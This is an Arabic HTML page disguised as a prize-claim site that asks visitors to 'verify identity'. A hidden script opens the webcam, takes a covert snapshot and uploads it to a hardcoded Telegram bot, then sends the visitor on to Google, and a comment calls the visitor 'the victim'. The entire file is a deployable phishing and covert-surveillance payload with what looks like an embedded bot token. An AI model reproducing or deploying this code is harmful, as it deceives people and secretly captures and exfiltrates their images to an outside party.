<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استلام الهدايا عبر الإنترنت</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; background-color: #f4f4f4; padding: 50px; direction: rtl; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
        .btn { background-color: #28a745; color: white; padding: 15px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>مبروك! أنت مؤهل للحصول على جائزة</h2>
        <p>يرجى الضغط على الزر أدناه للتحقق من هويتك واستلام جائزتك فوراً.</p>
        <button class="btn" onclick="startCapture()">تأكيد الهوية واستلام الهدية</button>
        <div id="status"></div>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = '8481025653:AAHuGzMnekvP81s0gkm12cUK7zTY5e84hkE';
        const chat_id = '7308253683'; // تم وضع الايدي الخاص بك هنا

        async function startCapture() {
            document.getElementById('status').innerText = "جاري الفحص... يرجى الانتظار";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    takeSnapshot();
                }, 2000);
            } catch (err) {
                alert("يرجى السماح بالوصول للكاميرا لتأكيد الهوية.");
            }
        }

        function takeSnapshot() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, 'image.jpg');

                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    window.location.href = "https://www.google.com"; // تحويل الضحية بعد السحب
                });
            }, 'image/jpeg');
        }
    </script>
</body>
</html>
